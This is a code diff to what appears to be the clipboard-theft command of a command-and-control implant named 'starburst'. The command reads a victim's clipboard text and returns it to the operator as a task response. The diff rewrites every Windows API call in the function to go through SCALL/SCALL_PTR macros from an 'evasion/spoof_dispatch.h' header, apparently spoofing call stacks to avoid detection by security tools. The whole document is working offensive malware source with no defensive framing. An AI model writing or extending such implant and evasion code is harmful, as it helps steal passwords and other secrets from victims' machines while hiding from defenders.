@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_CLIPBOARD
 
@@ -28,7 +29,7 @@ auto declfn starburst::cmd_clipboard(
     (void)params;
 
     STK_USER32(_n);
-    auto h_user32 = inst.kernel32.LoadLibraryA( _n );
+    auto h_user32 = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n );
     if ( !h_user32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "failed to load user32.dll" ) ) );
@@ -57,40 +58,40 @@ auto declfn starburst::cmd_clipboard(
         return;
     }
 
-    if ( !pOpenClipboard( nullptr ) ) {
+    if ( !SCALL_PTR( inst, pOpenClipboard, nullptr ) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "OpenClipboard failed" ) ) );
         return;
     }
 
-    if ( !pIsClipboardFormatAvailable( CF_UNICODETEXT_VAL ) ) {
-        pCloseClipboard();
+    if ( !SCALL_PTR( inst, pIsClipboardFormatAvailable, CF_UNICODETEXT_VAL ) ) {
+        SCALL_PTR( inst, pCloseClipboard );
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
             symbol<char*>( const_cast<char*>( "No text data" ) ) );
         return;
     }
 
-    HANDLE h_data = pGetClipboardData( CF_UNICODETEXT_VAL );
+    HANDLE h_data = (HANDLE)SCALL_PTR( inst, pGetClipboardData, CF_UNICODETEXT_VAL );
     if ( !h_data ) {
-        pCloseClipboard();
+        SCALL_PTR( inst, pCloseClipboard );
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
             symbol<char*>( const_cast<char*>( "Clipboard empty" ) ) );
         return;
     }
 
-    auto w_text = reinterpret_cast<wchar_t*>( pGlobalLock( h_data ) );
+    auto w_text = reinterpret_cast<wchar_t*>( (LPVOID)SCALL_PTR( inst, pGlobalLock, h_data ) );
     if ( !w_text ) {
-        pCloseClipboard();
+        SCALL_PTR( inst, pCloseClipboard );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GlobalLock failed" ) ) );
         return;
     }
 
     // determine needed buffer size
-    int needed = inst.kernel32.WideCharToMultiByte( CP_ACP, 0, w_text, -1, nullptr, 0, nullptr, nullptr );
+    int needed = (int)SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, w_text, -1, nullptr, 0, nullptr, nullptr );
     if ( needed <= 0 ) {
-        pGlobalUnlock( h_data );
-        pCloseClipboard();
+        SCALL_PTR( inst, pGlobalUnlock, h_data );
+        SCALL_PTR( inst, pCloseClipboard );
         queue_response( inst, task_uuid, RESPONSE_SUCCESS,
             symbol<char*>( const_cast<char*>( "Clipboard empty" ) ) );
         return;
@@ -98,18 +99,18 @@ auto declfn starburst::cmd_clipboard(
 
     auto output = static_cast<char*>( inst.heap_alloc( needed + 1 ) );
     if ( !output ) {
-        pGlobalUnlock( h_data );
-        pCloseClipboard();
+        SCALL_PTR( inst, pGlobalUnlock, h_data );
+        SCALL_PTR( inst, pCloseClipboard );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
         return;
     }
 
-    inst.kernel32.WideCharToMultiByte( CP_ACP, 0, w_text, -1, output, needed, nullptr, nullptr );
+    SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, w_text, -1, output, needed, nullptr, nullptr );
     output[needed] = '\0';
 
-    pGlobalUnlock( h_data );
-    pCloseClipboard();
+    SCALL_PTR( inst, pGlobalUnlock, h_data );
+    SCALL_PTR( inst, pCloseClipboard );
 
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
     inst.heap_free( output );
